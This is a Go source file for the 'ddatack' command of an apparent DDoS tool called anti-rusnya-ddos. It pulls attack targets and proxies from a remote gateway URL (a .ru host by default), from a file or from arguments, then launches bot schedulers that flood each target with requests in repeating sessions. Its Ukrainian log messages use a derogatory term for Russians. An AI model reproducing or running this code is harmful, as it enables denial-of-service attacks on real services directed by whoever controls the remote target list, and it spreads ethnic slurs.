package cmd

import (
	"context"
	"sync"
	"sync/atomic"

	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"

	"github.com/meddion/anti-rusnya-ddos/pkg"
)

var (
	ddatackCmd = &cobra.Command{
		Use:   "ddatack",
		Short: "надсилає багато запитів на обрані цілі, цілі оновлюються через API",
		Args:  cobra.MinimumNArgs(0),
		Run:   ddatackRun,
	}
	gateway    string
	src        string
	apiVersion int
)

func init() {
	ddatackCmd.PersistentFlags().StringVar(
		&gateway,
		"gateway",
		"http://rockstarbloggers.ru/hosts.json",
		"адреса, що повертає списки джерела для атаки",
	)
	ddatackCmd.PersistentFlags().StringVar(
		&src,
		"src",
		"",
		"джерело. адреса з якої отримати дані про атаку",
	)

	ddatackCmd.PersistentFlags().IntVar(
		&apiVersion,
		"api",
		2,
		"версія API джерела; досутпні версії: 1, 2",
	)
}

func ddatackRun(cmd *cobra.Command, args []string) {
	// Shutdown signal
	rootCtx, termProg := context.WithCancel(context.Background())
	startOsSignalHandler(termProg)

	epoch := int64(0)
	for {
		atomic.AddInt64(&epoch, 1)

		select {
		case <-rootCtx.Done():
			return
		default:
		}

		var (
			targets []pkg.Target
			proxies []pkg.Proxy
			err     error
		)

		switch {
		// Get data from a file
		case srcFile != "":
			targets, proxies, err = pkg.GetDataFromFile(rootCtx, srcFile, apiVersion)
			if err != nil {
				log.Fatalf("Не вдалося прочитати вміст файлу '%s': %v", srcFile, err)
			}
		// Get targets (no proxy) from args
		case len(args) > 0:
			targets = make([]pkg.Target, 0, len(args))
			for _, arg := range args {
				targets = append(targets, pkg.Target{URL: arg})
			}
		// Get data from API
		default:
			if src == "" {
				src, err = pkg.GetSrcFromAPIGateway(rootCtx, gateway)
				if err != nil {
					log.Errorf("Отримуючи списки джерел: %w", err)
					continue
				}
			}

			log.Infof("Обране джерело: %s\n (ПЕРЕВІРТЕ ЙОГО ДОСТОВІРНІСТЬ)", src)

			targets, proxies, err = pkg.GetDataFromAPISrc(rootCtx, src, apiVersion)
			if err != nil {
				log.Errorf("Не вдалося отримати коректні дані від джерела: %v", err)
				continue
			}

			log.Infoln("Дані із джерела підвантажено.")
		}

		if len(proxies) == 0 {
			log.Infoln("Проксі не знайдено")
			if onlyProxy {
				log.Fatalln("Не можу продовжити")
			}
		}
		log.Infoln("Знайдено цілей:")
		validTargets := make([]pkg.Target, 0, len(targets))
		for i, target := range targets {
			if err := pkg.ValidateTarget(&target); err != nil {
				log.Errorf("Під час валідації даних про атаку (перевірте джерело): %v", err)
				continue
			}
			validTargets = append(validTargets, target)
			log.Printf("%d) %s\n", i+1, target.URL)
		}

		log.Infof("Готуюся до атаки русні :) Сесія: %d \n", epoch)
		var wg sync.WaitGroup
		for _, target := range validTargets {
			botSched := pkg.NewBotScheduler(target, proxies, botsNum, maxErrCount, onlyProxy)
			if err := botSched.StartBots(rootCtx, &wg); err != nil {
				log.Errorf("Не вдалося запустити ботів: %v\n", err)
				continue
			}
		}

		wg.Wait()
	}
}
